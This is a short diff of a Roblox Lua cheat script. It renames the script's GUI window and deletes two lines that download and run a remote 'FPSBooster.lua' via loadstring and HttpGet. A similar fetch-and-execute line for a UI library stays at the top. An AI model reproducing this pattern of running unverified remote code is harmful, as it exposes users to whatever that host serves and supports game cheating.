@@ -1,5 +1,5 @@
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()
-local window = library:AddWindow("U3RT LOYALTY TIER 3 SCRIPT", {
+local window = library:AddWindow("Teivos Private Script", {
 	main_color = Color3.fromRGB(0, 0, 0), -- Color
 	min_size = Vector2.new(350, 346), -- Size of the gui
 	can_resize = false, -- true or false
@@ -1917,9 +1917,6 @@ game.ReplicatedStorage.evilKarmaFrame.Visible = bool
 game.ReplicatedStorage.goodKarmaFrame.Visible = bool
 game.ReplicatedStorage.gemsFrame.Visible = bool
 game.ReplicatedStorage.tokensFrame.Visible = bool
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
-
 end)
 switch:Set(false)
 
@@ -2040,8 +2037,6 @@ game.ReplicatedStorage.evilKarmaFrame.Visible = bool
 game.ReplicatedStorage.goodKarmaFrame.Visible = bool
 game.ReplicatedStorage.gemsFrame.Visible = bool
 game.ReplicatedStorage.tokensFrame.Visible = bool
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
 
 end)
 switch:Set(false)
